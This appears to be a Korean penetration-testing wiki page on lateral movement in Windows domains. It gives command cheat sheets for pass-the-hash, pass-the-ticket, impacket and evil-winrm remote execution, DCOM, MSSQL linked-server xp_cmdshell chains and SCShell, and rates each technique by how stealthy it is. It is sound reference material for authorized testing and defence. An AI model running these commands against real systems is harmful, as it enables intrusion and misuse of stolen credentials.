# 횡적 이동

네트워크 내 다른 호스트로 이동하는 단계.

획득한 credential(패스워드, 해시, 티켓 등)을 사용하여 다른 시스템에 접근한다.

---

## Pass-the-Hash (PtH)

NTLM 해시를 사용하여 인증하는 기법. 패스워드를 모르더라도 해시만으로 접근 가능하다.

```bash
# evil-winrm (WinRM)
evil-winrm -i <ip> -u <user> -H <ntlm_hash>

# PSExec (SMB, Local Admin 필요)
impacket-psexec <user>@<ip> -hashes :<ntlm_hash>

# WMIExec
impacket-wmiexec <user>@<ip> -hashes :<ntlm_hash>

# nxc로 접근 가능 여부 확인
nxc smb <ip> -u <user> -H <ntlm_hash>
nxc winrm <ip> -u <user> -H <ntlm_hash>
```

!!! note "PtH 제한사항"
    - RDP는 기본적으로 PtH 불가 (Restricted Admin 모드 활성화 시 가능)  
    - WinRM은 Remote Management Users 그룹 소속이거나 관리자여야 함  
    - PSExec은 Local Admin 권한 필요  
    - UAC RemoteAccountTokenFilterPolicy 설정에 따라 내장 Administrator 외 계정은 PtH 불가할 수 있음

---

## Pass-the-Ticket (PtT)

Kerberos 티켓(TGT/TGS)을 사용하여 인증하는 기법.

```bash
# .ccache 파일 사용 (Linux)
export KRB5CCNAME=<ticket>.ccache
impacket-psexec <domain>/<user>@<target> -k -no-pass
impacket-wmiexec <domain>/<user>@<target> -k -no-pass

# .kirbi 파일 사용 (Windows, Rubeus)
.\Rubeus.exe ptt /ticket:<base64_ticket>
```

---

## WinRM

Windows Remote Management. 5985(HTTP), 5986(HTTPS) 포트 사용.

```bash
# evil-winrm
evil-winrm -i <ip> -u <user> -p '<password>'
evil-winrm -i <ip> -u <user> -H <ntlm_hash>
```

---

## PSExec

SMB를 통해 원격 시스템에서 프로세스를 생성하는 기법. 대상 호스트의 ADMIN$ 공유에 쓰기 권한(= Local Admin) 필요.

```bash
# impacket-psexec
impacket-psexec <domain>/<user>:'<pass>'@<ip>
impacket-psexec <user>@<ip> -hashes :<ntlm_hash>
```

PSExec은 서비스를 생성/삭제하므로 이벤트 로그(7045, 7036)가 남는다.

---

## RDP

```bash
# xfreerdp
xfreerdp /u:<user> /p:'<pass>' /v:<ip> /cert-ignore /dynamic-resolution

# Hash로 RDP (Restricted Admin 모드 필요)
xfreerdp /u:<user> /pth:<ntlm_hash> /v:<ip> /cert-ignore
```

Restricted Admin 모드가 꺼져있으면 레지스트리 수정 필요:
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

---

## PowerShell Remoting

WinRM(5985/5986)을 통한 PowerShell 원격 실행. `Remote Management Users` 또는 로컬 관리자 권한 필요.

```powershell
# 대화형 세션
$cred = Get-Credential
Enter-PSSession -ComputerName TARGET -Credential $cred

# 원격 명령 실행 (비대화형)
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami; hostname }

# 여러 호스트에 동시 실행
Invoke-Command -ComputerName SRV01,SRV02,SRV03 -Credential $cred -ScriptBlock { hostname }

# 스크립트 파일 실행
Invoke-Command -ComputerName TARGET -Credential $cred -FilePath C:\scripts\enum.ps1
```

---

## SMBExec

SMB를 통한 반대화형 쉘. PSExec과 달리 디스크에 바이너리를 드롭하지 않음.

```bash
impacket-smbexec DOMAIN/user:pass@TARGET
impacket-smbexec DOMAIN/user@TARGET -hashes :NTHASH
```

---

## AtExec (Scheduled Task)

원격 Scheduled Task를 등록하여 명령 실행. Task가 출력을 ADMIN$ 공유에 기록.

```bash
impacket-atexec DOMAIN/user:pass@TARGET "whoami"
impacket-atexec DOMAIN/user@TARGET -hashes :NTHASH "ipconfig"
```

---

## SSH

```bash
# 패스워드
ssh <user>@<ip>

# SSH 키
ssh -i <private_key> <user>@<ip>

# SSH 키 권한 설정
chmod 600 <private_key>
```

---

## SMB를 이용한 파일 공유 기반 이동

```bash
# 파일 복사
copy \\<target>\C$\<path>\<file> .
xcopy <file> \\<target>\C$\<path>\ /Y

# PsExec.exe (Sysinternals)
PsExec.exe \\<target> -u <domain>\<user> -p <pass> cmd.exe
```

---

## DCOM

Distributed Component Object Model을 이용한 원격 코드 실행.

```bash
# Impacket
impacket-dcomexec <domain>/<user>:'<pass>'@<ip>
impacket-dcomexec <domain>/<user>@<ip> -hashes :NTHASH
```

```powershell
# PowerShell (MMC20.Application)
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami > C:\temp\out.txt","7")

# ShellBrowserWindow
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","TARGET"))
$com.Document.Application.ShellExecute("cmd.exe","/c whoami","","",0)
```

---

## MSSQL Lateral Movement

링크된 서버를 통한 체인 이동.

```sql
-- 현재 서버에서 링크 확인
SELECT * FROM sys.servers;

-- 링크된 서버에서 명령 실행
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];

-- 링크 체인 (A → B → C)
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [SERVER_C]') AT [SERVER_B];
```

---

## SCShell (Fileless)

서비스 설정을 일시적으로 변경하여 명령 실행. 파일을 드롭하지 않으며, 원래 서비스 설정으로 복원됨.

```bash
# SCShell
SCShell.exe TARGET XblAuthManager "C:\Windows\System32\cmd.exe /c whoami > C:\temp\out.txt" DOMAIN user pass
```

---

## 이동 기법 비교

| 기법 | 포트 | 필요 권한 | 로그 | OPSEC |
|------|------|-----------|------|-------|
| PSExec | 445 | Local Admin | 서비스 생성 이벤트 (7045) | 낮음 |
| SMBExec | 445 | Local Admin | 서비스 생성 (파일 없음) | 중간 |
| WMIExec | 135 | Local Admin | WMI 이벤트 | 중간 |
| AtExec | 445 | Local Admin | Task 등록 이벤트 | 중간 |
| evil-winrm | 5985 | Remote Mgmt Users | PowerShell 로그 | 중간 |
| PS Remoting | 5985 | Remote Mgmt Users | PowerShell 로그 | 중간 |
| DCOM | 135 | Local Admin | DCOM 이벤트 | 중간 |
| RDP | 3389 | RDP Users | 로그온 이벤트 (4624 Type 10) | 낮음 |
| SSH | 22 | SSH 접근 | auth 로그 | 높음 |
| SCShell | 445 | Local Admin | 서비스 설정 변경 | 높음 |
| MSSQL | 1433 | sa/sysadmin | SQL 로그 | 높음 |

---

!!! info "관련 페이지"
    - Pass-the-Hash/Ticket → [자격 증명 획득](../lifecycle/credential-access.md)
    - 각 프로토콜 상세 → [SMB](../protocols/smb.md), [WinRM](../protocols/winrm.md), [RDP](../protocols/rdp.md), [MSSQL](../protocols/mssql.md)
    - 횡적 이동 도구 → [도구 레퍼런스](../tools/index.md) (Impacket, Evil-WinRM)
